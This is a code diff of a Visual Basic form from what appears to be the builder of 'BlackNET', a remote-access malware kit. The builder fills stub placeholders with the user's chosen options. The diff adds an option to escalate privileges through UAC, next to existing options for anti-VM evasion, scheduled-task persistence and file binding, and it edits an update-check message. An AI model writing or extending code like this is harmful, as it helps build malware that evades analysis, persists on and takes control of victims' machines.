@@ -114,7 +114,7 @@ Public Class Form1
 
 
                                             If (str = "[AntiVM]") Then
-                                                current.Operand = FlatCheckBox3.Checked.ToString
+                                                current.Operand = FlatCheckBox13.Checked.ToString
                                             End If
 
                                             If (str = "[HardInstall]") Then
@@ -139,6 +139,10 @@ Public Class Form1
 
                                             If (str = "[Added_SchTask]") Then
                                                 current.Operand = FlatCheckBox10.Checked.ToString
+                                            End If
+
+                                            If (str = "[ElevateUAC]") Then
+                                                current.Operand = FlatCheckBox3.Checked.ToString
                                             End If
 
                                             If (str = "[BinderStatus]") Then
@@ -275,10 +279,7 @@ Public Class Form1
             MessageBox.Show("BlackNET is Up to Date.", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
             FlatStatusBar1.Text = "Up to Date"
         Else
-            MessageBox.Show("New update is available.", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
-            If Windows.Forms.DialogResult.OK Then
-                Process.Start("https://www.github.com/BlackHacker511/BlackNET")
-            End If
+            MessageBox.Show("New update is available," + vbNewLine + "Download it from GitHub", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
             FlatStatusBar1.Text = "New update is available."
         End If
     End Sub
